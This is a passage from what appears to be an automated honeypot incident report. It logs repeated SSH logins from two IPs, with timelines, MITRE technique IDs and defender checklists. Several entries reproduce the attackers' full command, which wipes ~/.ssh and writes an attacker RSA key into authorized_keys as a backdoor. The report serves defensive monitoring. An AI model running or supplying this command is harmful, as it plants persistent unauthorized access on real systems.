| **Source IP** | `118.194.234[.]8` |
| **First Seen** | 2026-04-07 11:46 |
| **Last Seen** | 2026-04-07 11:47 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 11:46:57` | `cowrie.session.connect` |
| `2026-04-07 11:46:57` | `cowrie.client.version` |
| `2026-04-07 11:46:57` | `cowrie.client.kex` |
| `2026-04-07 11:46:58` | `cowrie.login.success` |
| `2026-04-07 11:46:58` | `cowrie.session.params` |
| `2026-04-07 11:46:58` | `cowrie.command.input` |
| `2026-04-07 11:46:58` | `cowrie.command.failed` |
| `2026-04-07 11:46:58` | `cowrie.log.closed` |
| `2026-04-07 11:46:58` | `cowrie.session.params` |
| `2026-04-07 11:46:58` | `cowrie.command.input` |
| `2026-04-07 11:46:58` | `cowrie.session.file_download` |
| `2026-04-07 11:46:58` | `cowrie.log.closed` |
| `2026-04-07 11:47:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.194.234[.]8` to AbuseIPDB if not already reported
- [ ] Block `118.194.234[.]8` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a7b2db3f6e4d

| Field | Detail |
|---|---|
| **Source IP** | `118.194.234[.]8` |
| **First Seen** | 2026-04-07 11:47 |
| **Last Seen** | 2026-04-07 11:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 11:47:00` | `cowrie.session.connect` |
| `2026-04-07 11:47:00` | `cowrie.client.version` |
| `2026-04-07 11:47:00` | `cowrie.client.kex` |
| `2026-04-07 11:47:00` | `cowrie.login.success` |
| `2026-04-07 11:47:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.194.234[.]8` to AbuseIPDB if not already reported
- [ ] Block `118.194.234[.]8` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2c4bc3345cf2

| Field | Detail |
|---|---|
| **Source IP** | `147.135.251[.]134` |
| **First Seen** | 2026-04-07 11:48 |
| **Last Seen** | 2026-04-07 11:48 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 11:48:19` | `cowrie.session.connect` |
| `2026-04-07 11:48:19` | `cowrie.client.version` |
| `2026-04-07 11:48:19` | `cowrie.client.kex` |
| `2026-04-07 11:48:20` | `cowrie.login.success` |
| `2026-04-07 11:48:20` | `cowrie.session.params` |
| `2026-04-07 11:48:20` | `cowrie.command.input` |
| `2026-04-07 11:48:20` | `cowrie.command.failed` |
| `2026-04-07 11:48:20` | `cowrie.log.closed` |
| `2026-04-07 11:48:21` | `cowrie.session.params` |
| `2026-04-07 11:48:21` | `cowrie.command.input` |
| `2026-04-07 11:48:21` | `cowrie.session.file_download` |
| `2026-04-07 11:48:21` | `cowrie.log.closed` |
| `2026-04-07 11:48:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `147.135.251[.]134` to AbuseIPDB if not already reported
- [ ] Block `147.135.251[.]134` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-664a2929abf6

| Field | Detail |
|---|---|
| **Source IP** | `147.135.251[.]134` |
| **First Seen** | 2026-04-07 11:48 |
| **Last Seen** | 2026-04-07 11:48 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 11:48:23` | `cowrie.session.connect` |
| `2026-04-07 11:48:23` | `cowrie.client.version` |
| `2026-04-07 11:48:23` | `cowrie.client.kex` |
| `2026-04-07 11:48:24` | `cowrie.login.success` |
| `2026-04-07 11:48:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `147.135.251[.]134` to AbuseIPDB if not already reported
- [ ] Block `147.135.251[.]134` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-627d9bb71ad6

| Field | Detail |
|---|---|
| **Source IP** | `118.194.234[.]8` |
| **First Seen** | 2026-04-07 11:48 |
| **Last Seen** | 2026-04-07 11:48 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 11:48:40` | `cowrie.session.connect` |
| `2026-04-07 11:48:40` | `cowrie.client.version` |
| `2026-04-07 11:48:40` | `cowrie.client.kex` |
| `2026-04-07 11:48:41` | `cowrie.login.success` |
| `2026-04-07 11:48:41` | `cowrie.session.params` |
| `2026-04-07 11:48:41` | `cowrie.command.input` |
| `2026-04-07 11:48:41` | `cowrie.command.failed` |
| `2026-04-07 11:48:41` | `cowrie.log.closed` |
| `2026-04-07 11:48:41` | `cowrie.session.params` |
| `2026-04-07 11:48:41` | `cowrie.command.input` |
| `2026-04-07 11:48:41` | `cowrie.session.file_download` |
| `2026-04-07 11:48:41` | `cowrie.log.closed` |
| `2026-04-07 11:48:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.194.234[.]8` to AbuseIPDB if not already reported
- [ ] Block `118.194.234[.]8` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5e9635c9ad14

| Field | Detail |
|---|---|
| **Source IP** | `118.194.234[.]8` |
| **First Seen** | 2026-04-07 11:48 |
| **Last Seen** | 2026-04-07 11:48 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 11:48:43` | `cowrie.session.connect` |
| `2026-04-07 11:48:43` | `cowrie.client.version` |
| `2026-04-07 11:48:43` | `cowrie.client.kex` |
| `2026-04-07 11:48:43` | `cowrie.login.success` |
| `2026-04-07 11:48:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.194.234[.]8` to AbuseIPDB if not already reported
- [ ] Block `118.194.234[.]8` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-35cf18734c97

| Field | Detail |
|---|---|
| **Source IP** | `147.135.251[.]134` |
| **First Seen** | 2026-04-07 11:51 |
| **Last Seen** | 2026-04-07 11:51 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 11:51:16` | `cowrie.session.connect` |
| `2026-04-07 11:51:16` | `cowrie.client.version` |
| `2026-04-07 11:51:16` | `cowrie.client.kex` |
| `2026-04-07 11:51:17` | `cowrie.login.success` |
| `2026-04-07 11:51:17` | `cowrie.session.params` |
| `2026-04-07 11:51:17` | `cowrie.command.input` |
| `2026-04-07 11:51:17` | `cowrie.command.failed` |
| `2026-04-07 11:51:17` | `cowrie.log.closed` |
| `2026-04-07 11:51:18` | `cowrie.session.params` |
| `2026-04-07 11:51:18` | `cowrie.command.input` |
| `2026-04-07 11:51:18` | `cowrie.session.file_download` |
| `2026-04-07 11:51:18` | `cowrie.log.closed` |
| `2026-04-07 11:51:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `147.135.251[.]134` to AbuseIPDB if not already reported
- [ ] Block `147.135.251[.]134` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-181a8da43f0b

| Field | Detail |
|---|---|
| **Source IP** | `147.135.251[.]134` |
| **First Seen** | 2026-04-07 11:51 |
| **Last Seen** | 2026-04-07 11:51 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 11:51:20` | `cowrie.session.connect` |
| `2026-04-07 11:51:20` | `cowrie.client.version` |
| `2026-04-07 11:51:20` | `cowrie.client.kex` |
| `2026-04-07 11:51:21` | `cowrie.login.success` |
| `2026-04-07 11:51:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `147.135.251[.]134` to AbuseIPDB if not already reported
- [ ] Block `147.135.251[.]134` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4586a1c97a75

| Field | Detail |
|---|---|
| **Source IP** | `118.194.234[.]8` |
| **First Seen** | 2026-04-07 11:52 |
| **Last Seen** | 2026-04-07 11:52 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 11:52:12` | `cowrie.session.connect` |
| `2026-04-07 11:52:12` | `cowrie.client.version` |
| `2026-04-07 11:52:12` | `cowrie.client.kex` |
| `2026-04-07 11:52:12` | `cowrie.login.success` |
| `2026-04-07 11:52:12` | `cowrie.session.params` |
| `2026-04-07 11:52:12` | `cowrie.command.input` |
| `2026-04-07 11:52:12` | `cowrie.command.failed` |
| `2026-04-07 11:52:13` | `cowrie.log.closed` |
| `2026-04-07 11:52:13` | `cowrie.session.params` |
| `2026-04-07 11:52:13` | `cowrie.command.input` |
| `2026-04-07 11:52:13` | `cowrie.session.file_download` |
| `2026-04-07 11:52:13` | `cowrie.log.closed` |
| `2026-04-07 11:52:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.194.234[.]8` to AbuseIPDB if not already reported
- [ ] Block `118.194.234[.]8` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e59dd1165617

| Field | Detail |
|---|---|
| **Source IP** | `118.194.234[.]8` |
| **First Seen** | 2026-04-07 11:52 |
| **Last Seen** | 2026-04-07 11:52 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 11:52:14` | `cowrie.session.connect` |
| `2026-04-07 11:52:14` | `cowrie.client.version` |
| `2026-04-07 11:52:14` | `cowrie.client.kex` |
| `2026-04-07 11:52:15` | `cowrie.login.success` |
| `2026-04-07 11:52:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.194.234[.]8` to AbuseIPDB if not already reported
- [ ] Block `118.194.234[.]8` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fe6d7ef3ebe2

| Field | Detail |
|---|---|
| **Source IP** | `147.135.251[.]134` |
| **First Seen** | 2026-04-07 11:54 |
| **Last Seen** | 2026-04-07 11:54 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 11:54:15` | `cowrie.session.connect` |
| `2026-04-07 11:54:15` | `cowrie.client.version` |
| `2026-04-07 11:54:15` | `cowrie.client.kex` |
| `2026-04-07 11:54:15` | `cowrie.login.success` |
| `2026-04-07 11:54:16` | `cowrie.session.params` |
| `2026-04-07 11:54:16` | `cowrie.command.input` |
| `2026-04-07 11:54:16` | `cowrie.command.failed` |
| `2026-04-07 11:54:16` | `cowrie.log.closed` |
| `2026-04-07 11:54:16` | `cowrie.session.params` |
| `2026-04-07 11:54:16` | `cowrie.command.input` |
| `2026-04-07 11:54:16` | `cowrie.session.file_download` |
| `2026-04-07 11:54:16` | `cowrie.log.closed` |
| `2026-04-07 11:54:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `147.135.251[.]134` to AbuseIPDB if not already reported
- [ ] Block `147.135.251[.]134` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a18fad1519b9

| Field | Detail |
|---|---|
| **Source IP** | `147.135.251[.]134` |
| **First Seen** | 2026-04-07 11:54 |
| **Last Seen** | 2026-04-07 11:54 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 11:54:18` | `cowrie.session.connect` |
| `2026-04-07 11:54:18` | `cowrie.client.version` |
| `2026-04-07 11:54:19` | `cowrie.client.kex` |
| `2026-04-07 11:54:19` | `cowrie.login.success` |
| `2026-04-07 11:54:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `147.135.251[.]134` to AbuseIPDB if not already reported
- [ ] Block `147.135.251[.]134` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d3907b234dcf

| Field | Detail |
|---|---|
| **Source IP** | `147.135.251[.]134` |
| **First Seen** | 2026-04-07 11:55 |
| **Last Seen** | 2026-04-07 11:55 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 11:55:42` | `cowrie.session.connect` |
| `2026-04-07 11:55:42` | `cowrie.client.version` |
| `2026-04-07 11:55:43` | `cowrie.client.kex` |
| `2026-04-07 11:55:43` | `cowrie.login.success` |
| `2026-04-07 11:55:43` | `cowrie.session.params` |
| `2026-04-07 11:55:43` | `cowrie.command.input` |
| `2026-04-07 11:55:43` | `cowrie.command.failed` |
| `2026-04-07 11:55:44` | `cowrie.log.closed` |
| `2026-04-07 11:55:44` | `cowrie.session.params` |
| `2026-04-07 11:55:44` | `cowrie.command.input` |
| `2026-04-07 11:55:44` | `cowrie.session.file_download` |
| `2026-04-07 11:55:44` | `cowrie.log.closed` |
| `2026-04-07 11:55:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `147.135.251[.]134` to AbuseIPDB if not already reported
- [ ] Block `147.135.251[.]134` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2d4fb9d8d1da

| Field | Detail |
|---|---|
| **Source IP** | `147.135.251[.]134` |
| **First Seen** | 2026-04-07 11:55 |
| **Last Seen** | 2026-04-07 11:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 11:55:46` | `cowrie.session.connect` |
| `2026-04-07 11:55:46` | `cowrie.client.version` |
| `2026-04-07 11:55:46` | `cowrie.client.kex` |
| `2026-04-07 11:55:47` | `cowrie.login.success` |
| `2026-04-07 11:55:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `147.135.251[.]134` to AbuseIPDB if not already reported
- [ ] Block `147.135.251[.]134` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-87f4fad575c9

| Field | Detail |
|---|---|
| **Source IP** | `147.135.251[.]134` |
| **First Seen** | 2026-04-07 11:57 |
| **Last Seen** | 2026-04-07 11:57 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 11:57:12` | `cowrie.session.connect` |
| `2026-04-07 11:57:12` | `cowrie.client.version` |
| `2026-04-07 11:57:12` | `cowrie.client.kex` |
| `2026-04-07 11:57:12` | `cowrie.login.success` |
| `2026-04-07 11:57:13` | `cowrie.session.params` |
| `2026-04-07 11:57:13` | `cowrie.command.input` |
| `2026-04-07 11:57:13` | `cowrie.command.failed` |
| `2026-04-07 11:57:13` | `cowrie.log.closed` |
| `2026-04-07 11:57:13` | `cowrie.session.params` |
| `2026-04-07 11:57:13` | `cowrie.command.input` |
| `2026-04-07 11:57:13` | `cowrie.session.file_download` |
| `2026-04-07 11:57:13` | `cowrie.log.closed` |
| `2026-04-07 11:57:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `147.135.251[.]134` to AbuseIPDB if not already reported
- [ ] Block `147.135.251[.]134` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-36787a6fe821

| Field | Detail |
|---|---|
| **Source IP** | `147.135.251[.]134` |
| **First Seen** | 2026-04-07 11:57 |
| **Last Seen** | 2026-04-07 11:57 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 11:57:15` | `cowrie.session.connect` |
| `2026-04-07 11:57:15` | `cowrie.client.version` |
| `2026-04-07 11:57:16` | `cowrie.client.kex` |
| `2026-04-07 11:57:16` | `cowrie.login.success` |
| `2026-04-07 11:57:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `147.135.251[.]134` to AbuseIPDB if not already reported
- [ ] Block `147.135.251[.]134` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4cff1591f2d2

| Field | Detail |
|---|---|
| **Source IP** | `147.135.251[.]134` |
| **First Seen** | 2026-04-07 11:58 |
| **Last Seen** | 2026-04-07 11:58 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 11:58:37` | `cowrie.session.connect` |
| `2026-04-07 11:58:37` | `cowrie.client.version` |
